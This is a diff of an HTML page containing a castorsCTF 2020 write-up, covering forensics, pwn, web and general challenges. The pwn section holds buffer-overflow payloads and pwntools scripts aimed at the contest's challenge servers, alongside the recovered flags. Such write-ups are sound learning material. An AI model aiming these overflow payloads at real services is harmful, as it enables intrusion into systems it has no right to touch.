-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000ccc0: f85d 21b1 ffd9                           .]!...
+</code></pre></div></div><h5 id="flag-7">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{Wh0_s41d_AnY7hlnG_B0uT_m4tH}
+</code></pre></div></div><h3 id="forensics">Forensics</h3><h4 id="manipulation-50-points-151-solves">Manipulation (50 points 151 solves)</h4><h5 id="description-8">Description</h5><p>Author: icinta</p><p>One of our clients sent us the password but we got this instead. He insists the password is in the image, can you help us?</p><p><a href="/assets/files/castorsCTF20/pooh.jpg">pooh.jpg</a></p><h5 id="solution-8">Solution</h5><p>When opening the file, it looked like a hexdump, possibly one created using the tool <code class="language-plaintext highlighter-rouge">xxd</code>. The first line looked like the hexdump of a <code class="language-plaintext highlighter-rouge">jpg</code>, as it contains the string <code class="language-plaintext highlighter-rouge">Exif</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000010: 012c 0000 ffe1 20e8 4578 6966 0000 4949  .,.... .Exif..II
+</code></pre></div></div><p>The last line of the hexdump looked as if it should have been the first line, as it had the offset <code class="language-plaintext highlighter-rouge">00000000</code> and also contained the magic bytes of a jpeg:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000ccc0: f85d 21b1 ffd9                           .]!...
 00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 012c  ......JFIF.....,
-</code></pre></div></div>
-
-<p>I moved the last line to the beginning:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 012c  ......JFIF.....,
+</code></pre></div></div><p>I moved the last line to the beginning:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 012c  ......JFIF.....,
 00000010: 012c 0000 ffe1 20e8 4578 6966 0000 4949  .,.... .Exif..II
-</code></pre></div></div>
-
-<p>And then used <code class="language-plaintext highlighter-rouge">xxd -r pooh.jpg correct.jpg</code> to convert from the hexdump back
-into a “binary” file.</p>
-
-<p><img src="/assets/files/castorsCTF20/correct.jpg" alt="correct.jpg" /></p>
-
-<h5 id="flag-8">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{H3r3_Is_y0uR_Fl4gg}
-</code></pre></div></div>
-
-<h4 id="father-taurus-kernel-import-408-points-69-solves">Father Taurus Kernel Import! (408 points 69 solves)</h4>
-
-<h5 id="description-9">Description</h5>
-
-<p>Author: icinta</p>
-
-<p>We found a thumb drive lying on the floor. Luckily, it wasn’t a rubber ducky or
-contain a ransomware; either way, we’re still suspicious. We already went ahead
-and created the image, help us by analyzing it.</p>
-
-<p>https://bit.ly/2ZQEZyb</p>
-
-<h5 id="solution-9">Solution</h5>
-
-<p>To solve this challenge I tried to “grep to win”, but it didn’t work, so then I
-tried to grep for the base64 of the flag format and found the flag:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ grep 'castors' FloorDrive.001 # grep to win fails
+</code></pre></div></div><p>And then used <code class="language-plaintext highlighter-rouge">xxd -r pooh.jpg correct.jpg</code> to convert from the hexdump back into a “binary” file.</p><p><img src="/assets/files/castorsCTF20/correct.jpg" alt="correct.jpg"/></p><h5 id="flag-8">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{H3r3_Is_y0uR_Fl4gg}
+</code></pre></div></div><h4 id="father-taurus-kernel-import-408-points-69-solves">Father Taurus Kernel Import! (408 points 69 solves)</h4><h5 id="description-9">Description</h5><p>Author: icinta</p><p>We found a thumb drive lying on the floor. Luckily, it wasn’t a rubber ducky or contain a ransomware; either way, we’re still suspicious. We already went ahead and created the image, help us by analyzing it.</p><p>https://bit.ly/2ZQEZyb</p><h5 id="solution-9">Solution</h5><p>To solve this challenge I tried to “grep to win”, but it didn’t work, so then I tried to grep for the base64 of the flag format and found the flag:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ grep 'castors' FloorDrive.001 # grep to win fails
 $ echo -n "castorsCTF" | base64 # get the base64 of the flag format
 Y2FzdG9yc0NURg==
 $ grep --text -o 'Y2FzdG9yc.*' FloorDrive.001
 Y2FzdG9yc0NURntmMHIzbnMxY1NfbHNfSVRzXzBXbl9iMFNTfQ==T
 $ base64 -d &lt;&lt;&lt; "Y2FzdG9yc0NURntmMHIzbnMxY1NfbHNfSVRzXzBXbl9iMFNTfQ=="
 castorsCTF{f0r3ns1cS_ls_ITs_0Wn_b0SS}
-</code></pre></div></div>
-
-<h5 id="flag-9">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{f0r3ns1cS_ls_ITs_0Wn_b0SS}
-</code></pre></div></div>
-
-<h3 id="pwn">PWN</h3>
-
-<h4 id="abcbof-50-points-184-solves">abcbof (50 points 184 solves)</h4>
-
-<h5 id="description-10">Description</h5>
-
-<p>Author: Lunga</p>
-
-<p>nc chals20.cybercastors.com 14424</p>
-
-<p><a href="/assets/files/castorsCTF20/abcbof"><code class="language-plaintext highlighter-rouge">abcbof</code></a></p>
-
-<h5 id="solution-10">Solution</h5>
-
-<p>Decompiling the program in ghidra gives the following main function:</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</code></pre></div></div><h5 id="flag-9">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{f0r3ns1cS_ls_ITs_0Wn_b0SS}
+</code></pre></div></div><h3 id="pwn">PWN</h3><h4 id="abcbof-50-points-184-solves">abcbof (50 points 184 solves)</h4><h5 id="description-10">Description</h5><p>Author: Lunga</p><p>nc chals20.cybercastors.com 14424</p><p><a href="/assets/files/castorsCTF20/abcbof"><code class="language-plaintext highlighter-rouge">abcbof</code></a></p><h5 id="solution-10">Solution</h5><p>Decompiling the program in ghidra gives the following main function:</p><div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 
 <span class="p">{</span>
   <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
@@ -1154,44 +650,10 @@ castorsCTF{f0r3ns1cS_ls_ITs_0Wn_b0SS}
   <span class="n">puts</span><span class="p">(</span><span class="s">"You lose!"</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</code></pre></div></div>
-
-<p>For the <code class="language-plaintext highlighter-rouge">get_flag</code> function to run (which will print the flag), we must have the
-char array <code class="language-plaintext highlighter-rouge">local_18</code>, be equal to <code class="language-plaintext highlighter-rouge">CyberCastors</code>. This can be done by
-exploiting the use of the <code class="language-plaintext highlighter-rouge">gets</code> function.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'print("A" * 256 + "CyberCastors")' | nc chals20.cybercastors.com 14424
+</code></pre></div></div><p>For the <code class="language-plaintext highlighter-rouge">get_flag</code> function to run (which will print the flag), we must have the char array <code class="language-plaintext highlighter-rouge">local_18</code>, be equal to <code class="language-plaintext highlighter-rouge">CyberCastors</code>. This can be done by exploiting the use of the <code class="language-plaintext highlighter-rouge">gets</code> function.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'print("A" * 256 + "CyberCastors")' | nc chals20.cybercastors.com 14424
 Hello everyone, say your name: castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}
-</code></pre></div></div>
-
-<h5 id="flag-10">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}
-</code></pre></div></div>
-
-<h4 id="babybof1-86-points-145-solves">babybof1 (86 points 145 solves)</h4>
-
-<h5 id="description-11">Description</h5>
-
-<p>Author: Lunga</p>
-
-<p>nc chals20.cybercastors.com 14425</p>
-
-<p><a href="/assets/files/castorsCTF20/babybof"><code class="language-plaintext highlighter-rouge">babybof</code></a></p>
-
-<h5 id="solution-11">Solution</h5>
-
-<p>Redirect using a buffer overflow the execution to the function <code class="language-plaintext highlighter-rouge">get_flag</code>
-located at address <code class="language-plaintext highlighter-rouge">0x004006e7</code>.</p>
-
-<p>To find the location of the return pointer, I used gdb with the <code class="language-plaintext highlighter-rouge">cyclic</code> program
-distributed with <code class="language-plaintext highlighter-rouge">pwntools</code>.</p>
-
-<p><a href="https://asciinema.org/a/9bCjH0yyOnXFtnxi6JLW4WKE2"><img src="https://asciinema.org/a/9bCjH0yyOnXFtnxi6JLW4WKE2.svg" alt="asciicast" /></a></p>
-
-<p>I then a little <code class="language-plaintext highlighter-rouge">pwntools</code> script to get the flag:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import *
+</code></pre></div></div><h5 id="flag-10">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}
+</code></pre></div></div><h4 id="babybof1-86-points-145-solves">babybof1 (86 points 145 solves)</h4><h5 id="description-11">Description</h5><p>Author: Lunga</p><p>nc chals20.cybercastors.com 14425</p><p><a href="/assets/files/castorsCTF20/babybof"><code class="language-plaintext highlighter-rouge">babybof</code></a></p><h5 id="solution-11">Solution</h5><p>Redirect using a buffer overflow the execution to the function <code class="language-plaintext highlighter-rouge">get_flag</code> located at address <code class="language-plaintext highlighter-rouge">0x004006e7</code>.</p><p>To find the location of the return pointer, I used gdb with the <code class="language-plaintext highlighter-rouge">cyclic</code> program distributed with <code class="language-plaintext highlighter-rouge">pwntools</code>.</p><p><a href="https://asciinema.org/a/9bCjH0yyOnXFtnxi6JLW4WKE2"><img src="https://asciinema.org/a/9bCjH0yyOnXFtnxi6JLW4WKE2.svg" alt="asciicast"/></a></p><p>I then a little <code class="language-plaintext highlighter-rouge">pwntools</code> script to get the flag:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import *
 
 GET_FLAG = 0x004006e7
 
@@ -1200,37 +662,8 @@ r = remote('chals20.cybercastors.com', 14425)
 
 r.sendline(b"A" * 264 + p64(GET_FLAG))
 r.interactive()
-</code></pre></div></div>
-
-<p><a href="https://asciinema.org/a/Od5SRI0eGqWBWOa1zUgiCLNxz"><img src="https://asciinema.org/a/Od5SRI0eGqWBWOa1zUgiCLNxz.svg" alt="asciicast" /></a></p>
-
-<h5 id="flag-11">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{th4t's_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}
-</code></pre></div></div>
-
-<h4 id="babybof2-267-points-109-solves">babybof2 (267 points 109 solves)</h4>
-
-<h5 id="description-12">Description</h5>
-
-<p>Authors: icinta</p>
-
-<p>nc chals20.cybercastors.com 14434</p>
-
-<p><a href="/assets/files/castorsCTF20/winners"><code class="language-plaintext highlighter-rouge">winners</code></a></p>
-
-<h5 id="solution-12">Solution</h5>
-
-<p>The solution for this is similar to babybof1 except that the equivalent of the
-flag function has checks. I initially thought of bypassing these checks by just
-jumping inside of the <code class="language-plaintext highlighter-rouge">winnersLevel</code> function (the function that prints the flag
-(equivalent to <code class="language-plaintext highlighter-rouge">get_flag</code> in babybof1), after the checks. However this didn’t
-work because of the way the value is gotten from the stack.</p>
-
-<p>To fix this I “sprayed” the stack with the value that is wanted by the
-<code class="language-plaintext highlighter-rouge">winnersLevel</code> function hoping that it would find the value there which it did:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</code></pre></div></div><p><a href="https://asciinema.org/a/Od5SRI0eGqWBWOa1zUgiCLNxz"><img src="https://asciinema.org/a/Od5SRI0eGqWBWOa1zUgiCLNxz.svg" alt="asciicast"/></a></p><h5 id="flag-11">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{th4t's_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}
+</code></pre></div></div><h4 id="babybof2-267-points-109-solves">babybof2 (267 points 109 solves)</h4><h5 id="description-12">Description</h5><p>Authors: icinta</p><p>nc chals20.cybercastors.com 14434</p><p><a href="/assets/files/castorsCTF20/winners"><code class="language-plaintext highlighter-rouge">winners</code></a></p><h5 id="solution-12">Solution</h5><p>The solution for this is similar to babybof1 except that the equivalent of the flag function has checks. I initially thought of bypassing these checks by just jumping inside of the <code class="language-plaintext highlighter-rouge">winnersLevel</code> function (the function that prints the flag (equivalent to <code class="language-plaintext highlighter-rouge">get_flag</code> in babybof1), after the checks. However this didn’t work because of the way the value is gotten from the stack.</p><p>To fix this I “sprayed” the stack with the value that is wanted by the <code class="language-plaintext highlighter-rouge">winnersLevel</code> function hoping that it would find the value there which it did:</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
 </span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -1248,30 +681,8 @@ work because of the way the value is gotten from the stack.</p>
 <span class="c1">#attach(r)
 </span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
 <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div></div>
-
-<p><a href="https://asciinema.org/a/1yAUKuEBGpSAtUFvxpr1nWOCy"><img src="https://asciinema.org/a/1yAUKuEBGpSAtUFvxpr1nWOCy.svg" alt="asciicast" /></a></p>
-
-<h5 id="flag-12">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{b0F_s_4r3_V3rry_fuN_4m_l_r1ght}
-</code></pre></div></div>
-
-<h4 id="babyfmt-320-points-95-solves">babyfmt (320 points 95 solves)</h4>
-
-<h5 id="description-13">Description</h5>
-
-<p>Author: Lunga</p>
-
-<p>nc chals20.cybercastors.com 14426</p>
-
-<p><a href="/assets/files/castorsCTF20/babyfmt"><code class="language-plaintext highlighter-rouge">babyfmt</code></a></p>
-
-<h5 id="solution-13">Solution</h5>
-
-<p>Decompilation of the main function:</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</code></pre></div></div><p><a href="https://asciinema.org/a/1yAUKuEBGpSAtUFvxpr1nWOCy"><img src="https://asciinema.org/a/1yAUKuEBGpSAtUFvxpr1nWOCy.svg" alt="asciicast"/></a></p><h5 id="flag-12">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{b0F_s_4r3_V3rry_fuN_4m_l_r1ght}
+</code></pre></div></div><h4 id="babyfmt-320-points-95-solves">babyfmt (320 points 95 solves)</h4><h5 id="description-13">Description</h5><p>Author: Lunga</p><p>nc chals20.cybercastors.com 14426</p><p><a href="/assets/files/castorsCTF20/babyfmt"><code class="language-plaintext highlighter-rouge">babyfmt</code></a></p><h5 id="solution-13">Solution</h5><p>Decompilation of the main function:</p><div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 
 <span class="p">{</span>
   <span class="kt">FILE</span> <span class="o">*</span><span class="n">__stream</span><span class="p">;</span>
@@ -1297,93 +708,9 @@ work because of the way the value is gotten from the stack.</p>
   <span class="p">}</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</code></pre></div></div>
-
-<p>As you can see, it loads the flag into memory on the stack. This means that we
-can exploit the format string vulnerability later in the program to get the
-flag:</p>
-
-<p><a href="https://asciinema.org/a/NSMvTKHGiie9eVeEqz7lllWQH"><img src="https://asciinema.org/a/NSMvTKHGiie9eVeEqz7lllWQH.svg" alt="asciicast" /></a></p>
-
-<h5 id="flag-13">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{l34k_l34k_th4t_f0rm4t_str1n6_l34k}
-</code></pre></div></div>
-
-<h3 id="web">Web</h3>
-
-<h4 id="mixed-feelings-488-points-26-solves">Mixed Feelings (488 points 26 solves)</h4>
-
-<h5 id="description-14">Description</h5>
-
-<p>Author: icinta</p>
-
-<p>We tried to tell Jeff that one doesn’t go with the other but he didn’t listen.
-Can you please pwn him and reveal his dirty secrets? Also for some reason they
-told us he likes XXXTentacion.</p>
-
-<p>http://web1.cybercastors.com:14439/</p>
-
-<h5 id="solution-14">Solution</h5>
-
-<p>After accessing the webpage, there is PHP-like pseudo code visible that suggests
-to go to <code class="language-plaintext highlighter-rouge">/.flagkindsir</code>. On that page there are 2 buttons that send post
-requests, one for <code class="language-plaintext highlighter-rouge">cookies</code> and the other one for <code class="language-plaintext highlighter-rouge">puppies</code>. If you change the
-value from one of those to <code class="language-plaintext highlighter-rouge">flag</code>, you get the flag:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -i 'http://web1.cybercastors.com:14439/.flagkindsir' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'cookies=flag'
-</code></pre></div></div>
-
-<h5 id="flag-14">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{4_w1ld_fl4g_h0w_d1d_y0u_s0_cl3verLy_g3t_it}
-</code></pre></div></div>
-
-<h3 id="general">General</h3>
-
-<h4 id="welcome-50-points-257-solves">Welcome! (50 points 257 solves)</h4>
-
-<h5 id="description-15">Description</h5>
-
-<p>Author: hasu</p>
-
-<p>Oh jeez! With all the rush I must’ve dropped the welcome !flag somewhere in the
-server. If only we had a bot we could command to pick it up.</p>
-
-<h5 id="solution-15">Solution</h5>
-
-<p>To get the flag, send the message <code class="language-plaintext highlighter-rouge">!flag</code> on discord, a bot will message in DMs
-the flag.</p>
-
-<h5 id="flag-15">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{welcome_player_good_luck_and_have_fun}
-</code></pre></div></div>
-
-<h4 id="readme-50-points-363-solves">Readme (50 points 363 solves)</h4>
-
-<h5 id="description-16">Description</h5>
-
-<p>Author: hasu</p>
-
-<p>I noticed something strange while reading the rules… Must be my imagination.</p>
-
-<h5 id="solution-16">Solution</h5>
-
-<p>On the readme page, select the text next to the prizes:</p>
-
-<p><img src="/assets/files/castorsCTF20/readme.png" alt="Readme" /></p>
-
-<h5 id="flag-16">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{0u7_0f_5173_0u7_0f_m1nd}
-</code></pre></div></div>
-
-<time datetime="2020-05-31">31 May 2020</time>
-
-    </main>
-    <footer>
-      &copy; 2021 <a href="https://www.nilsand.re/">Nils André</a>
-    </footer>
-  </body>
-</html>
+</code></pre></div></div><p>As you can see, it loads the flag into memory on the stack. This means that we can exploit the format string vulnerability later in the program to get the flag:</p><p><a href="https://asciinema.org/a/NSMvTKHGiie9eVeEqz7lllWQH"><img src="https://asciinema.org/a/NSMvTKHGiie9eVeEqz7lllWQH.svg" alt="asciicast"/></a></p><h5 id="flag-13">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{l34k_l34k_th4t_f0rm4t_str1n6_l34k}
+</code></pre></div></div><h3 id="web">Web</h3><h4 id="mixed-feelings-488-points-26-solves">Mixed Feelings (488 points 26 solves)</h4><h5 id="description-14">Description</h5><p>Author: icinta</p><p>We tried to tell Jeff that one doesn’t go with the other but he didn’t listen. Can you please pwn him and reveal his dirty secrets? Also for some reason they told us he likes XXXTentacion.</p><p>http://web1.cybercastors.com:14439/</p><h5 id="solution-14">Solution</h5><p>After accessing the webpage, there is PHP-like pseudo code visible that suggests to go to <code class="language-plaintext highlighter-rouge">/.flagkindsir</code>. On that page there are 2 buttons that send post requests, one for <code class="language-plaintext highlighter-rouge">cookies</code> and the other one for <code class="language-plaintext highlighter-rouge">puppies</code>. If you change the value from one of those to <code class="language-plaintext highlighter-rouge">flag</code>, you get the flag:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -i 'http://web1.cybercastors.com:14439/.flagkindsir' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'cookies=flag'
+</code></pre></div></div><h5 id="flag-14">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{4_w1ld_fl4g_h0w_d1d_y0u_s0_cl3verLy_g3t_it}
+</code></pre></div></div><h3 id="general">General</h3><h4 id="welcome-50-points-257-solves">Welcome! (50 points 257 solves)</h4><h5 id="description-15">Description</h5><p>Author: hasu</p><p>Oh jeez! With all the rush I must’ve dropped the welcome !flag somewhere in the server. If only we had a bot we could command to pick it up.</p><h5 id="solution-15">Solution</h5><p>To get the flag, send the message <code class="language-plaintext highlighter-rouge">!flag</code> on discord, a bot will message in DMs the flag.</p><h5 id="flag-15">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{welcome_player_good_luck_and_have_fun}
+</code></pre></div></div><h4 id="readme-50-points-363-solves">Readme (50 points 363 solves)</h4><h5 id="description-16">Description</h5><p>Author: hasu</p><p>I noticed something strange while reading the rules… Must be my imagination.</p><h5 id="solution-16">Solution</h5><p>On the readme page, select the text next to the prizes:</p><p><img src="/assets/files/castorsCTF20/readme.png" alt="Readme"/></p><h5 id="flag-16">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{0u7_0f_5173_0u7_0f_m1nd}
+</code></pre></div></div><time datetime="2020-05-31">31 May 2020</time></main><footer> &copy; 2021 <a href="https://www.nilsand.re/">Nils André</a></footer></body></html>
